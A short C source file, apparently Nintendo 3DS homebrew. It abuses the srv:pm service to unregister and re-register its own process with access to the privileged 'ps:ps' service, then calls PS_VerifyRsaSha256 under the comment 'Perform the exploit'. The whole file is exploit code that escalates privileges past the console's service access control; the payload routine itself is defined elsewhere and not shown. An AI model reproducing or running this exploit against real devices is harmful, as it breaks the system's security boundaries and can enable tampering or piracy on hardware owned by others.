#include "types.h"
#include "pointers.h"
#include "svc.h"
#include "srv.h"
#include "srvpm.h"
#include "result.h"
#include "utils.h"

static const char accessList[][8] = {
    "ps:ps",
    "APT:U",
};

void main(void)
{
    u32 pid;
    Handle srvPmHandle, srvHandle, psHandle;

    // Grab access to PS
    srvPmInit(&srvPmHandle, &srvHandle);

    svcGetProcessId(&pid, CUR_PROCESS_HANDLE);
    SRVPM_UnregisterProcess(&srvPmHandle, pid);
    SRVPM_RegisterProcess(&srvPmHandle, pid, sizeof(accessList)/8, accessList);

    srvGetServiceHandle(&srvHandle, &psHandle, "ps:ps");

    // Perform the exploit
    PS_VerifyRsaSha256(&psHandle);

    while(true);
}
